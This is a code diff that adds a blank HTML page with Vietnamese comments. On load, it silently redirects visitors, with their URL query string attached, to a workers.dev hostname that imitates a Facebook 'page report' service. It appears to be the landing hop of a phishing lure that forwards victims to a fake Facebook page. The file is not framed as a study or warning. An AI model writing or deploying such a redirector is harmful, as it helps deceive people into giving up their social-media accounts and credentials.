@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title></title>
+    <script type="text/javascript">
+        // Hàm để lấy query string từ URL hiện tại
+        function getQueryString() {
+            var queryString = window.location.search;
+            return queryString;
+        }
+
+        // Hàm để thực hiện chuyển hướng với query string
+        function redirectToNewURL() {
+            var queryString = getQueryString();
+            var newURL = "https://redirect.facebook-page-report.workers.dev/" + queryString;
+            window.location.href = newURL;
+        }
+
+        // Gọi hàm chuyển hướng khi trang tải xong
+        window.onload = redirectToNewURL;
+    </script>
+</head>
+<body>
+    <p><p>
+</body>
+</html>
